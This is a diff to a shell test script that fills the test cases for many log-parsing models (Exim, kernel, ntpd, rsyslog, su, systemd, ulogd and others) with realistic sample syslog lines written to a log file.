+            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: \"SpamAssassin as sfgthib detected message as spam (998.0)\" 2014-11-06 09:14:13 1XmNp0-0005Qp-MR H=mail-qg0-f68.google.com [10.5.40.204]:42603 Warning: Message has been scanned: no virus or other harmful content was found" >> $LOG_FILE
+            echo "2014-11-06 09:14:13 1XmNp0-0005Qp-MR <= cpaneltest@gmail.com H=mail.fictional.example [10.5.40.204]:42603 P=esmtps X=TLSv1:RC4-SHA:128 S=3411 id=CAPtYmmQYRDb38yTmnA_ULZVjnKVOdtu6yw-HapGmjBCAk6rYYw@mail.gmail.com T=\"test\" for aaron@domain.com" >> $LOG_FILE
+            ;;
+        KernelMsgParsingModel)
+            echo "kernel: martian source 192.168.12.197 from 192.168.12.198, on dev bondib0" > $LOG_FILE
+            echo "kernel: martian source 192.168.1.255 from 192.168.1.251, on dev eth3" >> $LOG_FILE
+            echo "kernel: ll header: ff:ff:ff:ff:ff:ff:00:18:f8:0e:81:93:08:00" >> $LOG_FILE
+            echo "kernel: martian source 192.168.12.197 from 192.168.12.198, on dev bondib0" >> $LOG_FILE
+            echo "kernel: ll header: 00000000: ff ff ff ff ff ff 00 50 56 ad 59 09 08 00 .......PV.Y..." >> $LOG_FILE
+            echo "kernel: ll header: 00000000: ff ff ff ff ff ff a6 2c 90 bb 31 e9 08 06        .......,..1..." >> $LOG_FILE
+            ;;
+        NtpParsingModel)
+            echo "ntpd[8457]: Listen and drop on 0 v6wildcard [::]:123" > $LOG_FILE
+            echo "ntpd[8457]: Listen and drop on 1 v4wildcard 0.0.0.0:123" >> $LOG_FILE
+            echo "ntpd[8457]: Listen normally on 2 lo 127.0.0.1:123" >> $LOG_FILE
+            echo "ntpd[8457]: Listen normally on 3 eth0 1.2.2.19:123" >> $LOG_FILE
+            echo "ntpd[8457]: Listening on routing socket on fd #20 for interface updates" >> $LOG_FILE
+            echo "ntpd[21152]: logging to file /var/log/ntplog" >> $LOG_FILE
+            echo "ntpd[22760]: Soliciting pool server 78.41.116.113" >> $LOG_FILE
+            echo "ntpd[23165]: ntpd 4.2.8p12@1.3728-o (1): Starting" >> $LOG_FILE
+            echo "ntpd[23165]: Command line: ntpd" >> $LOG_FILE
+            echo "ntpd[23165]: must be run as root, not uid 1000" >> $LOG_FILE
+            echo "ntpd[23170]: proto: precision = 0.045 usec (-24)" >> $LOG_FILE
+            echo "ntpd[23170]: leapsecond file ('/usr/share/zoneinfo/leap-seconds.list'): good hash signature" >> $LOG_FILE
+            echo "ntpd[23170]: leapsecond file ('/usr/share/zoneinfo/leap-seconds.list'): loaded, expire=2021-12-28T00:00:00Z last=2017-01-01T00:00:00Z ofs=37" >> $LOG_FILE
+            echo "ntpd[23170]: unable to bind to wildcard address :: - another process may be running - EXITING" >> $LOG_FILE
+            ;;
+        RsyslogParsingModel)
+            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.4.2\" x-pid=\"1812\" x-info=\"http://www.rsyslog.com\"] rsyslogd was HUPed" > $LOG_FILE
+            echo "rsyslogd0: action 'action 17' resumed (module 'builtin:ompipe') [try http://www.rsyslog.com/e/0 ]" >> $LOG_FILE
+            echo "rsyslogd-2359: action 'action 17' resumed (module 'builtin:ompipe') [try http://www.rsyslog.com/e/2359 ]" >> $LOG_FILE
+            echo "rsyslogd-2007: action 'action 17' suspended, next retry is Sun May 24 06:56:28 2015 [try http://www.rsyslog.com/e/2007 ]" >> $LOG_FILE
+            echo "rsyslogd: rsyslogd's groupid changed to 109" >> $LOG_FILE
+            echo "rsyslogd: rsyslogd's userid changed to 104" >> $LOG_FILE
+            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2001.0\" x-pid=\"28018\" x-info=\"https://www.rsyslog.com\"] start" >> $LOG_FILE
+            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2001.0\" x-pid=\"542\" x-info=\"https://www.rsyslog.com\"] rsyslogd was HUPed" >> $LOG_FILE
+            echo "rsyslogd-2222: command 'KLogPermitNonKernelFacility' is currently not permitted - did you already set it via a RainerScript command (v6+ config)? [v8.16.0 try http://www.rsyslog.com/e/2222 ]" >> $LOG_FILE
+            ;;
         SshdParsingModel)
             echo "sshd[35618]: Server listening on 0.0.0.0 port 22." > $LOG_FILE
             echo "sshd[35619]: Failed password for someuser from 1.1.1.1 port 1372 ssh2" >> $LOG_FILE
@@ -477,27 +477,50 @@ EOL
             echo "sshd[4182]: error: Could not load host key: /etc/ssh/ssh_host_dsa_key" >> $LOG_FILE
             ;;
         SsmtpParsingModel)
-            exit $exit_code
-            echo "test17" > $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
-            echo "" >> $LOG_FILE
+            echo "sSMTP[24391]: /usr/sbin/sendmail sent mail for raul" > $LOG_FILE
             ;;
         SuSessionParsingModel)
-            echo "test18" > $LOG_FILE
+            echo "su[10710]: Successful su for user by root" > $LOG_FILE
+            echo "su[10710]: + ??? root:user" >> $LOG_FILE
+            echo "su[10710]: pam_unix(su:session): session opened for user user by (uid=0)" >> $LOG_FILE
+            echo "su[10710]: pam_unix(su:session): session closed for user user" >> $LOG_FILE
             ;;
         SyslogPreambleModel)
-            echo "test19" > $LOG_FILE
+            echo "Feb 29 00:01:41 mail-0 " > $LOG_FILE
+            echo "Mar  1 06:25:38 mail " >> $LOG_FILE
             ;;
         SystemdParsingModel)
-            echo "test20" > $LOG_FILE
+            echo "systemd[1]: phpsessionclean.service: Succeeded." > $LOG_FILE
+            echo "systemd[1]: Finished Clean php session files." >> $LOG_FILE
+            echo "systemd[1]: logrotate.service: Succeeded." >> $LOG_FILE
+            echo "systemd[1]: Finished Rotate log files." >> $LOG_FILE
+            echo "systemd[1]: man-db.service: Succeeded." >> $LOG_FILE
+            echo "systemd[1]: Finished Daily man-db regeneration." >> $LOG_FILE
+            echo "systemd[1]: Finished Ubuntu Advantage APT and MOTD Messages." >> $LOG_FILE
+            echo "systemd[1]: Finished Refresh fwupd metadata and update motd." >> $LOG_FILE
+            echo "systemd[1]: Finished Daily apt download activities." >> $LOG_FILE
+            echo "systemd[1]: Starting Daily apt upgrade and clean activities..." >> $LOG_FILE
+            echo "systemd[1]: Finished Daily apt upgrade and clean activities." >> $LOG_FILE
+            echo "systemd[1]: anacron.service: Killing process 39123 (update-notifier) with signal SIGKILL." >> $LOG_FILE
+            echo "systemd[1]: Starting PackageKit Daemon..." >> $LOG_FILE
+            echo "systemd[1]: Started PackageKit Daemon." >> $LOG_FILE
+            echo "systemd[1]: Reloading." >> $LOG_FILE
+            echo "systemd[2318]: var-lib-docker-overlay2-check\x2doverlayfs\x2dsupport037009939-merged.mount: Succeeded." >> $LOG_FILE
+            echo "systemd[2318]: Started VTE child process 54668 launched by gnome-terminal-server process 2984." >> $LOG_FILE
+            echo "systemd-logind[2445]: New session 2172664 of user dbi_backup." >> $LOG_FILE
+            echo "systemd-logind[760]: Session 230 logged out. Waiting for processes to exit." >> $LOG_FILE
+            echo "systemd-logind[760]: Removed session 230." >> $LOG_FILE
+            echo "systemd-logind[760]: New session 231 of user egoebelbecker." >> $LOG_FILE
+            echo "systemd-logind[467]: Failed to abandon session scope: Transport endpoint is not connected" >> $LOG_FILE
             ;;
         TomcatParsingModel)
-            echo "test21" > $LOG_FILE
+            # model is not updated to the latest version and therefore not tested.
+            rm $LOG_FILE
+            touch $LOG_FILE
             ;;
         UlogdParsingModel)
-            echo "test22" > $LOG_FILE
+            echo "ulogd[4655]: id=\"2001\" severity=\"info\" sys=\"SecureNet\" sub=\"packetfilter\" name=\"Packet dropped\" action=\"drop\" fwrule=\"60001\" initf=\"eth0\" srcmac=\"******\" dstmac=\"******x\" srcip=\"10.64.0.22\" dstip=\"10.64.0.10\" proto=\"6\" length=\"52\" tos=\"0x00\" prec=\"0x00\" ttl=\"128\" srcport=\"443\" dstport=\"56174\" tcpflags=\"ACK FIN\"" > $LOG_FILE
+            echo "ulogd[4655]: id=\"2001\" severity=\"info\" sys=\"SecureNet\" sub=\"packetfilter\" name=\"Packet dropped\" action=\"drop\" fwrule=\"60001\" initf=\"eth0\" srcmac=\"******xx\" dstmac=\"******x\" srcip=\"10.64.0.22\" dstip=\"10.64.0.10\" proto=\"6\" length=\"153\" tos=\"0x00\" prec=\"0x00\" ttl=\"128\" srcport=\"443\" dstport=\"56174\" tcpflags=\"ACK PSH FIN\"" >> $LOG_FILE
             ;;
         *)
             echo "Unknown parser config '$BN' was found! Please extend these tests. Failing.."
